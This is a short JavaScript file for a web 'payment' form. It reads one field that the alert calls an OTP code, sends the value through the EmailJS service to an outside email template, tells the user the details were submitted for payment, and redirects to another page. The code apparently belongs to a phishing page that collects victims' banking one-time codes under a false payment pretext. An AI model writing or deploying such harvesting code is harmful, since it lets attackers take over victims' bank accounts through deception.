

// Import EmailJS
//import emailjs from 'emailjs-com';

// Get the form element
const form = document.getElementById('payment-form');

// Add event listener to the form submit event
form.addEventListener('submit', (e) => {
  e.preventDefault();
  
  // Get the form data
  const bankName = document.getElementById('bank-name').value;
  

  // Check if all fields are filled
  if (!bankName) {
    alert('Kindly put the OTP Code.');
    return;
  }

  // Send the form data to EmailJS
  emailjs.send('service_9psisa9', 'template_azxewmk', {
   
    bank_name: bankName,
   
  })
  .then((response) => {
    console.log('Success!', response.status, response.text);
    alert('Details submitted for payment');
    // Reset the form
    form.reset();

    // Add the condition to load another page with file path
  window.location.href = 'submit.html';
    
  })
  .catch((error) => {
    console.error('Error:', error);
  });
});   